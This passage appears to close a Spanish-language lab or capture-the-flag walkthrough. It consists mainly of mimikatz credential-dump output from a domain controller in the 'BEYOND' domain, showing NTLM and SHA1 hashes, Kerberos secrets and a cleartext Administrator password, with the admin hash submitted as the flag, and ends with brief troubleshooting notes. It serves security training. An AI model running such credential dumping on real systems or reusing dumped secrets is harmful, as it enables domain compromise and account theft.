         * Password : d8 22 6c d6 e3 10 b0 9f 0e 0d 11 e6 17 0c e1 9f 1b 76 33 0c da 47 74 30 57 ed 70 22 ce f8 d4 f4 d8 fe 84 3c d7 b1 e2 e2 c9 80 9a f3 eb 40 24 e3 6d 12 81 f0 fc 4c 92 f6 e3 1c e6 80 3a 12 ae 6e 5e 1d 22 76 d0 30 da 34 ad 0d 95 f5 8a 93 38 f7 1e ed 61 93 aa 2d 0b 65 77 e5 a7 34 60 d6 f7 5e af ce 29 19 60 16 3f 24 bb 6b 3a f7 47 67 c9 48 ae 29 0a a5 27 6f a0 b7 06 d3 3a 03 eb 6f cb 05 47 7f 7b c8 3c 34 f8 b7 d0 bc 74 3b a4 89 a0 a4 5b b2 77 d9 0f 15 ae 75 cc b8 9c f2 aa a9 eb ba 35 dd 0e 61 99 b0 a2 4e 11 28 d6 a7 59 cc 77 c7 36 30 8d 70 e4 41 81 e0 d3 89 d0 b6 79 d8 9f a4 38 72 a9 bd bf aa c3 91 e5 b4 75 9c bd 94 43 06 1e cb 3f d7 d2 65 fd a7 50 41 8b e2 c6 eb 10 a0 a1 cc ec 75 4b 4c c7 c2 fd b2 f4 5e 43 5f 8f 1a 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 52233 (00000000:0000cc09)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 5/3/2025 12:21:15 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : DCSRV1$
         * Domain   : BEYOND
         * NTLM     : 1f2b1955a41f26eb6b3f5d291e300ce9
         * SHA1     : 08ac59fd0552ae0c628f2c86409ff11da9bd9770
        tspkg :
        wdigest :
         * Username : DCSRV1$
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : DCSRV1$
         * Domain   : beyond.com
         * Password : 4c 83 01 79 78 de a3 1c 38 c6 ae fa e4 57 71 2b 28 4a 77 b1 a3 fd 63 9e be e3 81 64 b0 ea 94 d4 f1 eb 98 c3 cc af b5 66 8b 88 ba 30 50 87 74 3d cd 38 89 96 f1 58 05 24 e5 c9 e8 9d ca c6 fe f8 93 cd d1 65 a6 3e 88 a4 f9 53 72 66 55 7b 30 c0 54 18 a6 61 db 93 a9 11 96 62 34 da fb 74 d5 87 b7 04 0d b2 d6 1d 33 2e 5d f3 bb 76 42 73 5d 9e 61 5b ca 21 12 d8 94 3c cf d6 03 43 d6 23 62 c5 e1 78 8b 2e 2a 78 d0 91 fd 57 c8 f4 3e 9f c6 e4 2c 0b 7c a9 5e 2d f3 35 05 13 a9 61 b3 7d 63 eb 0e 27 14 2d b6 70 95 b4 2f e2 6e d4 e0 74 a6 82 23 ab 83 07 77 4e 34 ff 56 c6 5e 86 95 d0 5b a1 ab c8 40 17 57 17 0f ea e1 5f 49 90 5b 75 96 51 0e 0e ba 0c 38 ec 08 8e f6 06 83 ce 9a 1d b0 15 24 36 85 a2 de 12 5f ff aa 37 db 92 5e 96 5d ed 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 52220 (00000000:0000cbfc)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 5/3/2025 12:21:15 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : DCSRV1$
         * Domain   : BEYOND
         * NTLM     : 1f2b1955a41f26eb6b3f5d291e300ce9
         * SHA1     : 08ac59fd0552ae0c628f2c86409ff11da9bd9770
        tspkg :
        wdigest :
         * Username : DCSRV1$
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : DCSRV1$
         * Domain   : beyond.com
         * Password : 4c 83 01 79 78 de a3 1c 38 c6 ae fa e4 57 71 2b 28 4a 77 b1 a3 fd 63 9e be e3 81 64 b0 ea 94 d4 f1 eb 98 c3 cc af b5 66 8b 88 ba 30 50 87 74 3d cd 38 89 96 f1 58 05 24 e5 c9 e8 9d ca c6 fe f8 93 cd d1 65 a6 3e 88 a4 f9 53 72 66 55 7b 30 c0 54 18 a6 61 db 93 a9 11 96 62 34 da fb 74 d5 87 b7 04 0d b2 d6 1d 33 2e 5d f3 bb 76 42 73 5d 9e 61 5b ca 21 12 d8 94 3c cf d6 03 43 d6 23 62 c5 e1 78 8b 2e 2a 78 d0 91 fd 57 c8 f4 3e 9f c6 e4 2c 0b 7c a9 5e 2d f3 35 05 13 a9 61 b3 7d 63 eb 0e 27 14 2d b6 70 95 b4 2f e2 6e d4 e0 74 a6 82 23 ab 83 07 77 4e 34 ff 56 c6 5e 86 95 d0 5b a1 ab c8 40 17 57 17 0f ea e1 5f 49 90 5b 75 96 51 0e 0e ba 0c 38 ec 08 8e f6 06 83 ce 9a 1d b0 15 24 36 85 a2 de 12 5f ff aa 37 db 92 5e 96 5d ed 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 502497 (00000000:0007aae1)
Session           : Batch from 0
User Name         : Administrator
Domain            : BEYOND
Logon Server      : DCSRV1
Logon Time        : 5/3/2025 12:23:34 PM
SID               : S-1-5-21-1104084343-2915547075-2081307249-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : BEYOND
         * NTLM     : 8480fa6ca85394df498139fe5ca02b95
         * SHA1     : d6ba3f188d0ecf00e089ca064d1fbc8566dc1b14
         * DPAPI    : 0f6271076fa7ddbdb444c50da3c75116
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : beyond.com
         * Password : HotspotAarlockBurrito2@1!
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 5/3/2025 12:21:15 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 82611 (00000000:000142b3)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 5/3/2025 12:21:15 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DCSRV1$
         * Domain   : BEYOND
         * NTLM     : 1f2b1955a41f26eb6b3f5d291e300ce9
         * SHA1     : 08ac59fd0552ae0c628f2c86409ff11da9bd9770
        tspkg :
        wdigest :
         * Username : DCSRV1$
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : DCSRV1$
         * Domain   : beyond.com
         * Password : 4c 83 01 79 78 de a3 1c 38 c6 ae fa e4 57 71 2b 28 4a 77 b1 a3 fd 63 9e be e3 81 64 b0 ea 94 d4 f1 eb 98 c3 cc af b5 66 8b 88 ba 30 50 87 74 3d cd 38 89 96 f1 58 05 24 e5 c9 e8 9d ca c6 fe f8 93 cd d1 65 a6 3e 88 a4 f9 53 72 66 55 7b 30 c0 54 18 a6 61 db 93 a9 11 96 62 34 da fb 74 d5 87 b7 04 0d b2 d6 1d 33 2e 5d f3 bb 76 42 73 5d 9e 61 5b ca 21 12 d8 94 3c cf d6 03 43 d6 23 62 c5 e1 78 8b 2e 2a 78 d0 91 fd 57 c8 f4 3e 9f c6 e4 2c 0b 7c a9 5e 2d f3 35 05 13 a9 61 b3 7d 63 eb 0e 27 14 2d b6 70 95 b4 2f e2 6e d4 e0 74 a6 82 23 ab 83 07 77 4e 34 ff 56 c6 5e 86 95 d0 5b a1 ab c8 40 17 57 17 0f ea e1 5f 49 90 5b 75 96 51 0e 0e ba 0c 38 ec 08 8e f6 06 83 ce 9a 1d b0 15 24 36 85 a2 de 12 5f ff aa 37 db 92 5e 96 5d ed 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 48784 (00000000:0000be90)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 5/3/2025 12:21:13 PM
SID               : 
        msv :
         [00000003] Primary
         * Username : DCSRV1$
         * Domain   : BEYOND
         * NTLM     : 1f2b1955a41f26eb6b3f5d291e300ce9
         * SHA1     : 08ac59fd0552ae0c628f2c86409ff11da9bd9770
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCSRV1$
Domain            : BEYOND
Logon Server      : (null)
Logon Time        : 5/3/2025 12:21:13 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : DCSRV1$
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : dcsrv1$
         * Domain   : BEYOND.COM
         * Password : 4c 83 01 79 78 de a3 1c 38 c6 ae fa e4 57 71 2b 28 4a 77 b1 a3 fd 63 9e be e3 81 64 b0 ea 94 d4 f1 eb 98 c3 cc af b5 66 8b 88 ba 30 50 87 74 3d cd 38 89 96 f1 58 05 24 e5 c9 e8 9d ca c6 fe f8 93 cd d1 65 a6 3e 88 a4 f9 53 72 66 55 7b 30 c0 54 18 a6 61 db 93 a9 11 96 62 34 da fb 74 d5 87 b7 04 0d b2 d6 1d 33 2e 5d f3 bb 76 42 73 5d 9e 61 5b ca 21 12 d8 94 3c cf d6 03 43 d6 23 62 c5 e1 78 8b 2e 2a 78 d0 91 fd 57 c8 f4 3e 9f c6 e4 2c 0b 7c a9 5e 2d f3 35 05 13 a9 61 b3 7d 63 eb 0e 27 14 2d b6 70 95 b4 2f e2 6e d4 e0 74 a6 82 23 ab 83 07 77 4e 34 ff 56 c6 5e 86 95 d0 5b a1 ab c8 40 17 57 17 0f ea e1 5f 49 90 5b 75 96 51 0e 0e ba 0c 38 ec 08 8e f6 06 83 ce 9a 1d b0 15 24 36 85 a2 de 12 5f ff aa 37 db 92 5e 96 5d ed 
        ssp :
        credman :
        cloudap :

mimikatz # 
```
flag 8480fa6ca85394df498139fe5ca02b95

## Troubleshooting

**Tener la session MSF en ejecucion**
**Respetar el orden en el cual se ejecutan los comandos**

## Herramientas Alternativas
- [ ] **Herramienta 1:** Descripción breve (Comando)
- [ ] **Herramienta 2:** Descripción breve (Comando)
- [ ] **Herramienta 3:** Descripción breve (Comando)

